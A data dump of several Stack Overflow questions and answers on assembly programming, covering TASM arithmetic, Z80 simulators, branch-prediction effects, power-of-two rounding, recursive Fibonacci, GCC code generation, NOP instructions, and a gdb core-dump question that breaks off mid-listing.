","10285461"
"Adding or Subtracting two numbers in x86 Assembly (TASM)","33075","","<p>I am attempting to write a program in Assembly to take a plus or minus sign as the first input ( deciding whether to plus or minus two numbers together ) and then taking two 2 digit numbers and adding/subtracting and displaying the result. I have the following code so far, but I am having troubles in the output. I know in the code snippet below it is simply displaying a single char, but I would like it to display the actual output but I have no idea how, attempting to use a normal string display interrupt does not work because the size of num2 or al does not match the size of dx (the output string register)</p>

<pre><code>.MODEL SMALL
.STACK 100h
.DATA
choice_msg  db 13,10,'Addition or Subtraction?',13,10,'$' 

first_msg   db 13,10,'Enter the first number:',13,10,'$'   
second_msg  db 13,10,'Enter the second number:',13,10,'$'    
result_msg  db 13,10,'The result is:',13,10,'$'    
new_line    db 13,10,'$'    
val1        db ?    
num2        db ?    
num3        db ?    
num4        db ?      
ten         db 10    

.CODE                       ;where the code is written

start:

mov ax, @data           ;Moves the address of the variables under .DATA into ax

mov ds,ax           ;moves ax into ds. the two lines allow you to display string using the 21h interrupt sequence 9

    mov ah,09
    mov dx, offset choice_msg
    int 21h             ;displays the string in choice_msg

    mov ah,01
    int 21h             ;copies a value into the al, using subfunction 01
    mov val1,al         ;moves the value in the al to the variable val1

    cmp val1,'+'            ;compares the entered value in val1 with ""+""
    je addition         ;if the enterd value is ""+"" then it jumps to addition else it jumps to subtraction

addition:
    mov ah,09
    mov dx, offset first_msg
    int 21h             ;displays the string in first_msg

    mov ah,01
    int 21h             ;copies a value into the al, using subfunction 01
    sub al,48           ;subtracts 48 from the vaule in the al
    mov num2,al         ;moves the value in the al to the variable num2

    mov ah,01           
    int 21h             ;copies a value into the al, using subfunction 01
    sub al,48           ;subtracts 48 from the value in the al
    mov num3,al         ;moves the value in the al to the variable num3

    mov al,num2         ;moves the value in num2 into the al
    mul ten             ;multiplies the value in the al by ten
    add al,num3         ;adds the value in num3 to the al, to get the two-digit number
    mov num2,al         ;moves the two digit value into

    mov ah,09
    mov dx, offset new_line 
    int 21h             ;goes to the next line, i.e. ""enter""

    mov ah,09
    mov dx, offset second_msg   ;displays the string in second_msg
    int 21h             

    mov ah,01
    int 21h             ;copies a value into the al, using subfunction 01
    sub al,48           ;subtracts 48 from the value in the al
    mov num3,al         ;moves the new value in the al into the variable num3

    mov ah,01
    int 21h             ;copies a value into the al, using subfunction 01
    sub al,48           ;subtracts 48 from the value in the al
    mov num4,al         ;moves the new value in the al into the variable num4

    mov al,num3         ;moves the value in num3 into the al
    mul ten             ;multiplies the value in the al by ten
    add al,num4         ;adds the value in num4 to the al, to get a two-digit number
    mov num3,al         ;moves the value in the al into the variable num3

    mov ah,09
    mov dx, offset new_line
    int 21h             ;goes to the next line, i.e. ""enter""

    mov ah,09
    mov dx, offset result_msg
    int 21h             ;displays the string in reslut_msg

    ; mov the value of num 3 into bl
    mov bl, num3

    add num2,bl         ;adds num3 and num2 to form the sum
    add num2,48         ;adds 48 to num2


    mov al,num2
    mov ah,02
    mov dl, al
    int 21h             ;displays the value that was in the al

    mov ah,09
    mov dx, offset new_line
    int 21h             ; goes to next line, i.e. ""enter""

    mov ax,4c00h
    int 21h             ;ends the program


subtraction:
    mov ah,09
    mov dx, offset first_msg
    int 21h             ;displays the string in first_msg

    mov ah,01
    int 21h             ;copies a value into the al, using subfunction 001
    sub al,48           ;subtracts 48 from the value in the al
    mov num2,al         ;moves the value in the al into the variable num2

    mov ah,01
    int 21h             ;copies a value into the al, using subfunction 01
    sub al,48           ;subtracts 48 from the value in the al
    mov num3,al         ;moves the value in the al into the variable num3

    mov al,num2         ;moves the value in num2 into the al
    mul ten             ;multiplies the value in the al by ten
    add al,num3         ;adds the value in num3 to the al, to get a two-digit number
    mov num2,al         ;moves the value in the al into the variable num2

    mov ah,09
    mov dx, offset new_line 
    int 21h             ;goes to the next line, i.e. ""enter""

    mov ah,09
    mov dx, offset second_msg
    int 21h             ;displays the string in second_msg

    mov ah,01
    int 21h             ;copies a value into the al, using subfunction 01
    sub al,48           ;subtracts 48 from the value in the al
    mov num3,al         ;moves the value in the al into the variable num3

    mov ah,01
    int 21h             ;copies a value into the al, using subfuntion 01
    sub al,48           ;subtracts 48 from the value in the al
    mov num4,al         ;moves the value in the al into the variable num4

    mov al,num3         ;moves the value in num3 into the al
    mul ten             ;multiplies the value in the al by ten
    add al,num4         ;adds the value in num4 to the al, to get a two-digit number
    mov num3,al         ;moves the value in the al into the variable num3

    mov ah,09
    mov dx, offset new_line
    int 21h             ;goes to next line, i.e. ""enter""

    mov ah,09
    mov dx, offset result_msg
    int 21h             ;displays the string in result_msg

    mov bl, num3        ;move value of num3 to bl

    sub num2,bl         ;subtracts the value in num3 from the value in num2
    add num2,48         ;adds 48 to the new value in num2
    mov al,num2         ;moves the value in num2 into the al
    mov ah,02
    mov dh,al
    int 21h             ;displays the resulting value

    mov ah,09
    mov dx, offset new_line
    int 21h             ;goes to the next line, i.e. ""enter""

    mov ax,4c00h
    int 21h             ;ends the program

END
</code></pre>
","<p>Thanks for the help! I found a way that works quite well, for my code. See it below:</p>

<p>About the duplicate code:
Yes I realised that (this is not actually my code, it was a friends that needed fixing), I fixed up the code and proceduralised a lot of it to minimalise code re-use. And the result is the final program here:
I know the code is not perfect, and there are many performance improvements that can be made but the outcome is a working program with an okay execution time.</p>

<pre><code>.MODEL SMALL
.STACK 100h
.DATA

choice_msg  db 13,10,'Addition or Subtraction?',13,10,'$' 
first_msg   db 13,10,'Enter the first number:',13,10,'$'
second_msg  db 13,10,'Enter the second number:',13,10,'$'
result_msg  db 13,10,'The result is:',13,10,'$'
new_line    db 13,10,'$'
val1        db ?
num1        db ?
num2        db ?
num3        db ?        ; purely a buffer variable 
ten         db 10   
t1          db 0
t2          db 0     
result      db 0

.CODE                   ;where the code is written
start:  

    mov ax, @data           ;Moves the address of the variables under .DATA into ax
    mov ds,ax           ;moves ax into ds. the two lines allow you to display string using the 21h interrupt sequence 9

    mov ah,09
    mov dx, offset choice_msg
    int 21h             ;displays the string in choice_msg

    mov ah,01
    int 21h             ;copies a value into the al, using subfunction 01

    cmp al,'+'          ;compares the entered value in with ""+""
    jne subtraction         ;if the enterd value is ""+"" then it jumps to addition else it jumps to subtraction

addition: 

    call read           ;Read the input
    call endl           ;output new line

    mov bl, num2        ;move the value of num 2 into bl

    add num1,bl         ;adds num2 and num1 to form the sum1
    mov al, num1        ;mov num1 to al
    mov result, al      ;store the result of the sum in result

    call write          ;write the output 
    jmp exit

subtraction:

    call read           ;Read the input
    call endl           ;output new line

    mov bl, num2        ;move value of num2 to bl

    sub num1,bl         ;subtracts the value in num2 from the value in num1
    mov al, num1        ;move result to a register
    mov result, al      ;move the result of the subtraction to result

    call write          ;display result with write procedure
    jmp exit


    ;-----------------------
    ;procedure declarations: 

    proc endl

        mov ah,09
        mov dx, offset new_line
        int 21h             ;goes to next line, i.e. ""enter""

        ret

    endp


    proc read


        mov ah,09
        mov dx, offset first_msg
        int 21h             ;displays the string in first_msg

        mov ah,01           ;read char
        int 21h             ;copies a value into the al, using subfunction 01
        sub al,48           ;subtracts 48 from the vaule in the al
        mov num1,al         ;moves the value in the al to the variable num1

        mov ah,01           ;read second char
        int 21h             ;copies a value into the al, using subfunction 01
        sub al,48           ;subtracts 48 from the value in the al
        mov num2,al         ;moves the value in the al to the variable num2

        mov al,num1         ;moves the value in num1 into the al
        mul ten             ;multiplies the value in the al by ten
        add al,num2         ;adds the value in num2 to the al, to get the two-digit number
        mov num1,al         ;moves the two digit value into

        call endl

        mov ah,09
        mov dx, offset second_msg   ;displays the string in second_msg
        int 21h             

        mov ah,01
        int 21h             ;copies a value into the al, using subfunction 01
        sub al,48           ;subtracts 48 from the value in the al
        mov num2,al         ;moves the new value in the al into the variable num2

        mov ah,01
        int 21h             ;copies a value into the al, using subfunction 01
        sub al,48           ;subtracts 48 from the value in the al
        mov num3,al         ;moves the new value in the al into the variable num3

        mov al,num2         ;moves the value in num2 into the al
        mul ten             ;multiplies the value in the al by ten
        add al,num3         ;adds the value in num3 to the al, to get a two-digit number
        mov num2,al         ;moves the value in the al into the variable num2

        ret                 ;first number in num1, second in num2    
    endp


    ;The write procedure writes the decimal stored in result.
    ;by dividing by ten it seperates the two digits as quotient
    ;and remainder. Then it outputs the quotient and remainder
    ;in ascii form.
    proc write
            mov dx,offset result_msg
            mov ah,09h
            int 21h         ;display the result_msg string

            mov al,result   ;move the result from add/sub to al
            mov ah,00       ;initialize ah
            div ten         ;div al by ten, quotient is in al 
                            ;remainder is stored in ah.

            mov dl,ah       ;move the remainder to dl
            mov t2,dl       ;store the remainder in t2

            mov dl,al       ;move quotient into dl
            add dl,48       ;add 48 to dl, to convert it to ascii
            mov ah,02h      ;char display interupt code
            int 21h         ;display char in dl register

            mov dl,t2       ;move remainder to t2
            add dl,48       ;convert it to ascii by adding 48
            mov ah,02h      ;display character in dl interupt code
            int 21h         ;diplays contents of dl 

            call endl       ;output a new line
            ret             


    endp


    exit:
    mov ax, 4c00h               ;This is just a failsafe exit
    int 21h


END
</code></pre>
","18695687"
"Assembler IDE/Simulator for beginner","32995","","<p>I'd like to learn how to program in Assembler. I've done a bit of assembly before (during my A-Level Computing course) but that was very definitely a simplified 'pseudo-assembler'. I've borrowed my Dad's old Z80 Assembler reference manual, and that seems quite interesting so if possible I'd like to have a go with Z80 assembler.</p>

<p>However, I don't have a Z80 processor to hand, and would like to do it on my PC (I have windows or linux so either is good). I've found various assemblers around on the internet, but I'm not particularly interested in assembling down to a hex file, I want to just be able to assemble it to something that some kind of simulator on the PC can run. Preferably this simulator would show me the contents of all the registers, memory locations etc, and let me step through instructions. I've found a few bits of software that suggest they might do this - but they either refuse to compile, or don't seem to work properly. Has anyone got any suggestions? If there are good simulator/IDE things available for another type of assembler then I could try that instead (assuming there is a good online reference manual available).</p>
","<blockquote>
  <p>I've found a few bits of software that suggest they might do this - but they either
  refuse to compile, or don't seem to work properly. Has anyone got any suggestions?</p>
</blockquote>

<p>Write one. You're best off picking a nice, simple instruction set (Z80 should be perfect). I remember doing this as a first-year undergraduate exercise - I think we wrote the simulator in C++ and simulated 6800 assembly, but really any language/instruction set will do.</p>

<p>The idea of ""learning assembly language"" these days is to get the idea of how computers work at the lowest level, only a select few (compiler writers, etc.) have any real reason to actually be writing assembly code these days. Modern processors are stuffed full of features designed to be used by compilers to help optimise code for speed/concurrent execution/power consumption/etc., and trying to write assembly by hand for a modern processor would be a nightmare. </p>

<p>Don't fret about getting your application production-ready unless you want to - in all likelihood the bits of software you've found so far were written by people exactly like you who wanted to figure out how assembly works and wrote their own simulator, then realised how much work would be involved in getting it ""production ready"" so the general public could use it.</p>
","36972"
"Why would introducing useless MOV instructions speed up a tight loop in x86_64 assembly?","32834","","<p><strong>Background:</strong></p>

<p>While optimizing some <a href=""http://en.wikipedia.org/wiki/Pascal_%28programming_language%29"">Pascal</a> code with embedded assembly language, I noticed an unnecessary <code>MOV</code> instruction, and removed it.</p>

<p>To my surprise, removing the un-necessary instruction caused my program to <em>slow down</em>.</p>

<p>I found that <strong>adding arbitrary, useless <code>MOV</code> instructions increased performance</strong> even further.</p>

<p>The effect is erratic, and changes based on execution order: <strong>the same junk instructions transposed</strong> up or down by a single line <strong>produce a slowdown</strong>.</p>

<p>I understand that the CPU does all kinds of optimizations and streamlining, but, this seems more like black magic.</p>

<p><strong>The data:</strong></p>

<p>A version of my code conditionally compiles <strong>three junk operations</strong> in the middle of a loop that runs <code>2**20==1048576</code> times. (The surrounding program just calculates <a href=""http://en.wikipedia.org/wiki/SHA-2"">SHA-256</a> hashes).</p>

<p>The results on my rather old machine (Intel(R) Core(TM)2 CPU 6400  @ 2.13&nbsp;GHz):</p>

<pre><code>avg time (ms) with -dJUNKOPS: 1822.84 ms
avg time (ms) without:        1836.44 ms
</code></pre>

<p>The programs were run 25 times in a loop, with the run order changing randomly each time.</p>

<p><strong>Excerpt:</strong></p>

<pre><code>{$asmmode intel}
procedure example_junkop_in_sha256;
  var s1, t2 : uint32;
  begin
    // Here are parts of the SHA-256 algorithm, in Pascal:
    // s0 {r10d} := ror(a, 2) xor ror(a, 13) xor ror(a, 22)
    // s1 {r11d} := ror(e, 6) xor ror(e, 11) xor ror(e, 25)
    // Here is how I translated them (side by side to show symmetry):
  asm
    MOV r8d, a                 ; MOV r9d, e
    ROR r8d, 2                 ; ROR r9d, 6
    MOV r10d, r8d              ; MOV r11d, r9d
    ROR r8d, 11    {13 total}  ; ROR r9d, 5     {11 total}
    XOR r10d, r8d              ; XOR r11d, r9d
    ROR r8d, 9     {22 total}  ; ROR r9d, 14    {25 total}
    XOR r10d, r8d              ; XOR r11d, r9d

    // Here is the extraneous operation that I removed, causing a speedup
    // s1 is the uint32 variable declared at the start of the Pascal code.
    //
    // I had cleaned up the code, so I no longer needed this variable, and 
    // could just leave the value sitting in the r11d register until I needed
    // it again later.
    //
    // Since copying to RAM seemed like a waste, I removed the instruction, 
    // only to discover that the code ran slower without it.
    {$IFDEF JUNKOPS}
    MOV s1,  r11d
    {$ENDIF}

    // The next part of the code just moves on to another part of SHA-256,
    // maj { r12d } := (a and b) xor (a and c) xor (b and c)
    mov r8d,  a
    mov r9d,  b
    mov r13d, r9d // Set aside a copy of b
    and r9d,  r8d

    mov r12d, c
    and r8d, r12d  { a and c }
    xor r9d, r8d

    and r12d, r13d { c and b }
    xor r12d, r9d

    // Copying the calculated value to the same s1 variable is another speedup.
    // As far as I can tell, it doesn't actually matter what register is copied,
    // but moving this line up or down makes a huge difference.
    {$IFDEF JUNKOPS}
    MOV s1,  r9d // after mov r12d, c
    {$ENDIF}

    // And here is where the two calculated values above are actually used:
    // T2 {r12d} := S0 {r10d} + Maj {r12d};
    ADD r12d, r10d
    MOV T2, r12d

  end
end;
</code></pre>

<p><strong>Try it yourself:</strong></p>

<p>The code is online <a href=""https://github.com/tangentstorm/coinops/tree/junkops"">at GitHub</a> if you want to try it out yourself.</p>

<p><strong>My questions:</strong></p>

<ul>
<li>Why would uselessly copying a register's contents to <a href=""http://en.wikipedia.org/wiki/Random-access_memory"">RAM</a> ever increase performance?</li>
<li>Why would the same useless instruction provide a speedup on some lines, and a slowdown on others?</li>
<li>Is this behavior something that could be exploited predictably by a compiler?</li>
</ul>
","<p>The most likely cause of the speed improvement is that:</p>

<ul>
<li>inserting a MOV shifts the subsequent instructions to different memory addresses</li>
<li>one of those moved instructions was an important conditional branch</li>
<li>that branch was being incorrectly predicted due to aliasing in the branch prediction table</li>
<li>moving the branch eliminated the alias and allowed the branch to be predicted correctly</li>
</ul>

<p>Your Core2 doesn't keep a separate history record for each conditional jump. Instead it keeps a shared history of all conditional jumps.  One disadvantage of <a href=""http://en.wikipedia.org/wiki/Branch_predictor#Global_branch_prediction"" rel=""nofollow noreferrer"">global branch prediction</a> is that the history is diluted by irrelevant information if the different conditional jumps are uncorrelated.</p>

<p>This little <a href=""http://www.ece.unm.edu/~jimp/611/slides/chap4_5.html"" rel=""nofollow noreferrer"">branch prediction tutorial</a> shows how branch prediction buffers work. The cache buffer is indexed by the lower portion of the address of the branch instruction.  This works well unless two important uncorrelated branches share the same lower bits.  In that case, you end-up with aliasing which causes many mispredicted branches (which stalls the instruction pipeline and slowing your program).</p>

<p>If you want to understand how branch mispredictions affect performance, take a look at this excellent answer:  <a href=""https://stackoverflow.com/a/11227902/1001643"">https://stackoverflow.com/a/11227902/1001643</a></p>

<p>Compilers typically don't have enough information to know which branches will alias and whether those aliases will be significant.  However, that information can be determined at runtime with tools such as <a href=""http://valgrind.org/docs/manual/cg-manual.html"" rel=""nofollow noreferrer"">Cachegrind</a> and <a href=""http://software.intel.com/en-us/forums/topic/392268"" rel=""nofollow noreferrer"">VTune</a>.</p>
","17906589"
"Algorithm for finding the smallest power of two that's greater or equal to a given value","32662","","<p>I need to find the smallest power of two that's greater or equal to a given value. So far, I have this:</p>

<pre><code>int value = 3221; // 3221 is just an example, could be any number
int result = 1;

while (result &lt; value) result &lt;&lt;= 1;
</code></pre>

<p>It works fine, but feels kind of naive. Is there a better algorithm for that problem?</p>

<p>EDIT. There were some nice Assembler suggestions, so I'm adding those tags to the question.</p>
","<p>Here's my favorite.  Other than the initial check for whether it's invalid (&lt;0, which you could skip if you knew you'd only have >=0 numbers passed in), it has no loops or conditionals, and thus will outperform most other methods.  This is similar to erickson's answer, but I think that my decrementing x at the beginning and adding 1 at the end is a little less awkward than his answer (and also avoids the conditional at the end).</p>

<pre><code>/// Round up to next higher power of 2 (return x if it's already a power
/// of 2).
inline int
pow2roundup (int x)
{
    if (x &lt; 0)
        return 0;
    --x;
    x |= x &gt;&gt; 1;
    x |= x &gt;&gt; 2;
    x |= x &gt;&gt; 4;
    x |= x &gt;&gt; 8;
    x |= x &gt;&gt; 16;
    return x+1;
}
</code></pre>
","365068"
"Recursive Fibonacci in Assembly","32093","","<p>I'm attempting to implement a recursive Fibonacci program in Assembly. However, my program crashes, with an unhandled exception, and I can't seem to pick out the problem. I don't doubt that it involves my improper use of the stack, but I can't seem to point out where...</p>

<pre><code>.386
.model Flat
public Fibonacci
include iosmacros.inc ;includes macros for outputting to the screen

.code
Fibonacci proc

MOV EAX, [EBP+8]
CMP EAX, 1
    JA Recurse
    MOV ECX, 1
    JMP exit

Recurse:
    DEC EAX
    MOV EDX, EAX
    PUSH EAX
    CALL Fibonacci
    ADD ESP, 4
    MOV EBX, ECX
    DEC EDX
    PUSH EDX
    CALL Fibonacci
    ADD ECX, EBX
exit:
ret
Fibonacci endp


.data


end
</code></pre>

<p>Also, I've pushed the number that I'm using to get the Fibonacci value to the stack in an external procedure. Any ideas where the problem might lie?</p>
","<p>When you perform a <code>call</code>, the address of the next operation is pushed to the stack as a return value. When creating a function, it is often customary to create a ""stack frame"". This frame can be used to print the call stack, as well as an offset for local variables and arguments. The frame is created through two operations at the beginning of the function:</p>

<pre><code>push ebp
mov ebp, esp
</code></pre>

<p>At the end of the function, the call stack is removed using <code>leave</code>, which is equivalent to the reverse of those 2 operations. When using a stack frame, value of <code>esp</code> is stored into <code>ebp</code>, making it point to a location on the stack called the frame's base. Since, above this address, there are the old value of <code>ebp</code> and the return address, you would normally get the first argument using <code>[ebp+8]</code>. However, you did not set up a stack frame. This means that the old value of <code>ebp</code> was not pushed to the stack, and the current value of <code>ebp</code> cannot be used to get arguments because you don't know where it is. Therefore, you should get your argument using <code>[esp+4]</code>.</p>

<p>Also, it is customary that return values are placed in <code>eax</code> and <code>ebx</code> be preserved for the caller. Your code does not follow either of these conventions. Also, technically functions aren't required to preserved <code>ecx</code> or <code>edx</code>, so normally you should push them to the stack before calling another function if you want them preserved. With this code, <code>edx</code> and <code>ebx</code> would be overwritten if called with a value greater than 2, causing an invalid result.</p>

<p>Here is a full listing which includes all of the fixes I have mentioned. I did not create a stack frame as it is not necessary and your code didn't.</p>

<pre><code>.386
.model Flat
public Fibonacci
include iosmacros.inc ;includes macros for outputting to the screen

.code
Fibonacci proc

    MOV EAX, [ESP+4]
    CMP EAX, 1
    JA Recurse
    MOV EAX, 1 ; return value in eax
    JMP exit

Recurse:
    PUSH EBX ; preserve value of ebx
    DEC EAX
    PUSH EAX
    CALL Fibonacci
    MOV EBX, EAX ; ebx is preserved by callee, so it is safe to use
    DEC [ESP] ; decrement the value already on the stack
    CALL Fibonacci
    ADD EAX, EBX ; return value in eax
    ADD ESP, 4 ; remove value from stack
    POP EBX ; restore old value of ebx
exit:
ret
Fibonacci endp
</code></pre>
","5616829"
"Eclipse error: No source available for """"","31960","","<p>Using Eclipse Helios in Mac OS X Leopard and debugging C++ code calling fsf gdb 7.1, the debugging stops at first line of main. Then after the first step I get</p>

<pre><code>No source available for """"
View disassembly
</code></pre>

<p>Why this error? Should I give additional options for compilation? Eclipse generated automatically the Makefile</p>
","<p>I had the same problem and the following solved it:</p>

<p>Go to menu <code>Run-&gt;Debug Configurations...</code> and a dialogue window opens. On the left there should be selected your project name (say <em>MyProject</em> for example) under <code>C/C++ Application</code>. If not select it. Then on the right side, select the tab <code>main</code> and make sure that in the textbox under <code>C/C++ Application</code> reads: <em>Debug/MyProject</em>. Also check that <em>Debug</em> is selected in the dropdown box next to <code>Build Configuration:</code> below.</p>

<p>In my case instead of <em>Debug/MyProject</em>, it was <em>Release/MyProject</em>. I never understood why. Anyway...</p>

<p>Hope that helps</p>
","5459312"
"Why does GCC generate such radically different assembly for nearly the same C code?","31627","","<p>While writing an optimized <code>ftol</code> function I found some very odd behaviour in <code>GCC 4.6.1</code>. Let me show you the code first (for clarity I marked the differences):</p>

<p>fast_trunc_one, C:</p>

<pre><code>int fast_trunc_one(int i) {
    int mantissa, exponent, sign, r;

    mantissa = (i &amp; 0x07fffff) | 0x800000;
    exponent = 150 - ((i &gt;&gt; 23) &amp; 0xff);
    sign = i &amp; 0x80000000;

    if (exponent &lt; 0) {
        r = mantissa &lt;&lt; -exponent;                       /* diff */
    } else {
        r = mantissa &gt;&gt; exponent;                        /* diff */
    }

    return (r ^ -sign) + sign;                           /* diff */
}
</code></pre>

<p>fast_trunc_two, C:</p>

<pre><code>int fast_trunc_two(int i) {
    int mantissa, exponent, sign, r;

    mantissa = (i &amp; 0x07fffff) | 0x800000;
    exponent = 150 - ((i &gt;&gt; 23) &amp; 0xff);
    sign = i &amp; 0x80000000;

    if (exponent &lt; 0) {
        r = (mantissa &lt;&lt; -exponent) ^ -sign;             /* diff */
    } else {
        r = (mantissa &gt;&gt; exponent) ^ -sign;              /* diff */
    }

    return r + sign;                                     /* diff */
}
</code></pre>

<p>Seems the same right? Well GCC disagrees. After compiling with <code>gcc -O3 -S -Wall -o test.s test.c</code> this is the assembly output:</p>

<p>fast_trunc_one, generated:</p>

<pre><code>_fast_trunc_one:
LFB0:
    .cfi_startproc
    movl    4(%esp), %eax
    movl    $150, %ecx
    movl    %eax, %edx
    andl    $8388607, %edx
    sarl    $23, %eax
    orl $8388608, %edx
    andl    $255, %eax
    subl    %eax, %ecx
    movl    %edx, %eax
    sarl    %cl, %eax
    testl   %ecx, %ecx
    js  L5
    rep
    ret
    .p2align 4,,7
L5:
    negl    %ecx
    movl    %edx, %eax
    sall    %cl, %eax
    ret
    .cfi_endproc
</code></pre>

<p>fast_trunc_two, generated:</p>

<pre><code>_fast_trunc_two:
LFB1:
    .cfi_startproc
    pushl   %ebx
    .cfi_def_cfa_offset 8
    .cfi_offset 3, -8
    movl    8(%esp), %eax
    movl    $150, %ecx
    movl    %eax, %ebx
    movl    %eax, %edx
    sarl    $23, %ebx
    andl    $8388607, %edx
    andl    $255, %ebx
    orl $8388608, %edx
    andl    $-2147483648, %eax
    subl    %ebx, %ecx
    js  L9
    sarl    %cl, %edx
    movl    %eax, %ecx
    negl    %ecx
    xorl    %ecx, %edx
    addl    %edx, %eax
    popl    %ebx
    .cfi_remember_state
    .cfi_def_cfa_offset 4
    .cfi_restore 3
    ret
    .p2align 4,,7
L9:
    .cfi_restore_state
    negl    %ecx
    sall    %cl, %edx
    movl    %eax, %ecx
    negl    %ecx
    xorl    %ecx, %edx
    addl    %edx, %eax
    popl    %ebx
    .cfi_restore 3
    .cfi_def_cfa_offset 4
    ret
    .cfi_endproc
</code></pre>

<p>That's an <strong>extreme</strong> difference. This actually shows up on the profile too, <code>fast_trunc_one</code> is around 30% faster than <code>fast_trunc_two</code>. Now my question: what is causing this?</p>
","<p><strong>Updated to sync with the OP's edit</strong></p>

<p>By tinkering with the code, I've managed to see how GCC optimizes the first case.</p>

<p><strong>Before we can understand why they are so different, first we must understand how GCC optimizes <code>fast_trunc_one()</code>.</strong></p>

<p>Believe it or not, <code>fast_trunc_one()</code> is being optimized to this:</p>

<pre><code>int fast_trunc_one(int i) {
    int mantissa, exponent;

    mantissa = (i &amp; 0x07fffff) | 0x800000;
    exponent = 150 - ((i &gt;&gt; 23) &amp; 0xff);

    if (exponent &lt; 0) {
        return (mantissa &lt;&lt; -exponent);             /* diff */
    } else {
        return (mantissa &gt;&gt; exponent);              /* diff */
    }
}
</code></pre>

<p>This produces the exact same assembly as the original <code>fast_trunc_one()</code> - register names and everything.</p>

<p>Notice that there are no <code>xor</code>s in the assembly for <code>fast_trunc_one()</code>. That's what gave it away for me.</p>

<hr>

<h1>How so?</h1>

<hr>

<p><strong>Step 1:</strong> <code>sign = -sign</code></p>

<p>First, let's take a look at the <code>sign</code> variable. Since <code>sign = i &amp; 0x80000000;</code>, there are only two possible values that <code>sign</code> can take:</p>

<ul>
<li><code>sign = 0</code></li>
<li><code>sign = 0x80000000</code></li>
</ul>

<p>Now recognize that in both cases, <code>sign == -sign</code>. Therefore, when I change the original code to this:</p>

<pre><code>int fast_trunc_one(int i) {
    int mantissa, exponent, sign, r;

    mantissa = (i &amp; 0x07fffff) | 0x800000;
    exponent = 150 - ((i &gt;&gt; 23) &amp; 0xff);
    sign = i &amp; 0x80000000;

    if (exponent &lt; 0) {
        r = mantissa &lt;&lt; -exponent;
    } else {
        r = mantissa &gt;&gt; exponent;
    }

    return (r ^ sign) + sign;
}
</code></pre>

<p>It produces the exact same assembly as the original <code>fast_trunc_one()</code>. I'll spare you the assembly, but it is identical - register names and all.</p>

<hr>

<p><strong>Step 2:</strong> Mathematical reduction: <code>x + (y ^ x) = y</code></p>

<p><code>sign</code> can only take one of two values, <code>0</code> or <code>0x80000000</code>.</p>

<ul>
<li>When <code>x = 0</code>, then <code>x + (y ^ x) = y</code> then trivial holds.</li>
<li>Adding and xoring by <code>0x80000000</code> is the same. It flips the sign bit. Therefore <code>x + (y ^ x) = y</code> also holds when <code>x = 0x80000000</code>.</li>
</ul>

<p>Therefore, <code>x + (y ^ x)</code> reduces to <code>y</code>. And the code simplifies to this:</p>

<pre><code>int fast_trunc_one(int i) {
    int mantissa, exponent, sign, r;

    mantissa = (i &amp; 0x07fffff) | 0x800000;
    exponent = 150 - ((i &gt;&gt; 23) &amp; 0xff);
    sign = i &amp; 0x80000000;

    if (exponent &lt; 0) {
        r = (mantissa &lt;&lt; -exponent);
    } else {
        r = (mantissa &gt;&gt; exponent);
    }

    return r;
}
</code></pre>

<p>Again, this compiles to the exact same assembly - register names and all.</p>

<hr>

<p>This above version finally reduces to this:</p>

<pre><code>int fast_trunc_one(int i) {
    int mantissa, exponent;

    mantissa = (i &amp; 0x07fffff) | 0x800000;
    exponent = 150 - ((i &gt;&gt; 23) &amp; 0xff);

    if (exponent &lt; 0) {
        return (mantissa &lt;&lt; -exponent);             /* diff */
    } else {
        return (mantissa &gt;&gt; exponent);              /* diff */
    }
}
</code></pre>

<p>which is pretty much exactly what GCC generates in the assembly.</p>

<hr>

<p>So why doesn't the compiler optimize <code>fast_trunc_two()</code> to the same thing?</p>

<p>The key part in <code>fast_trunc_one()</code> is the <code>x + (y ^ x) = y</code> optimization. In <code>fast_trunc_two()</code> the <code>x + (y ^ x)</code> expression is being split across the branch. </p>

<p>I suspect that might be enough to confuse GCC to not make this optimization. (It would need to hoist the <code>^ -sign</code> out of the branch and merge it into the <code>r + sign</code> at the end.)</p>

<p>For example, this produces the same assembly as <code>fast_trunc_one()</code>:</p>

<pre><code>int fast_trunc_two(int i) {
    int mantissa, exponent, sign, r;

    mantissa = (i &amp; 0x07fffff) | 0x800000;
    exponent = 150 - ((i &gt;&gt; 23) &amp; 0xff);
    sign = i &amp; 0x80000000;

    if (exponent &lt; 0) {
        r = ((mantissa &lt;&lt; -exponent) ^ -sign) + sign;             /* diff */
    } else {
        r = ((mantissa &gt;&gt; exponent) ^ -sign) + sign;              /* diff */
    }

    return r;                                     /* diff */
}
</code></pre>
","10251097"
"What's the purpose of the nop opcode?","31442","","<p>I'm going through MSIL and noticing there are a lot of <a href=""http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes.nop.aspx"" rel=""noreferrer"">nop</a> instructions. The MSDN article says they take no action and are used to fill space if the opcode is patched. They're used a lot more in debug builds than release builds. I know that these kinds of statements are used in assembly languages to make sure an opcode fits on a word boundary, but why is it needed in MSIL?</p>
","<p>NOPs serve several purposes:</p>

<ul>
<li>They allow the debugger to place a breakpoint on a line even if it is combined with others in the generated code.</li>
<li>It allows the loader to patch a jump with a different-sized target offset.</li>
<li>It allows a block of code to be aligned at a particular boundary, which can be good for caching.</li>
<li>It allows for incremental linking to overwrite chunks of code with a call to a new section without having to worry about the overall function changing size.</li>
</ul>
","235007"
"Why do I get in gdb ""Cannot access memory at address 0x..."" while inspecting a core dump?","31432","","<p>I get this message when I try to print the following line while analysing a core dump.</p>

<pre><code>(gdb) p/x *($esi)
Cannot access memory at address 0xe6d3a030
</code></pre>

<p>I mention that the address pointed by <code>%esi</code> <code>(0xe6d3a030)</code> should point to some valid allocated data. ( when I run this program myself and break on the same instruction this print has some meaningful information )</p>

<p>What are the possible causes for this? Am I missing some info from the core dump?</p>

<p>If yes what information am I missing? Shouldn't the core dump contain a snapshot of all the allocated memory?</p>

<p>edit:
when I use in gdb ""maintenance info sections"" command while the coredump is loaded I get the info presented bellow. I can see that the address 0xe6d3a030 is in the range  <code>0xe6d00000-&gt;0xe6dfb000 at 0x0f5aa000: load93 ALLOC LOAD HAS_CONTENTS</code> Doesn't this mean it was loaded?</p>

<pre><code>(gdb) maintenance info sections 
Exec file:
    `/home/Administrator/Documents/coredump/myproc-debug-8.1.bin', file type elf32-i386.
    0x8048134-&gt;0x8048147 at 0x00000134: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048148-&gt;0x8048168 at 0x00000148: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048168-&gt;0x804818c at 0x00000168: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804818c-&gt;0x80acd94 at 0x0000018c: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
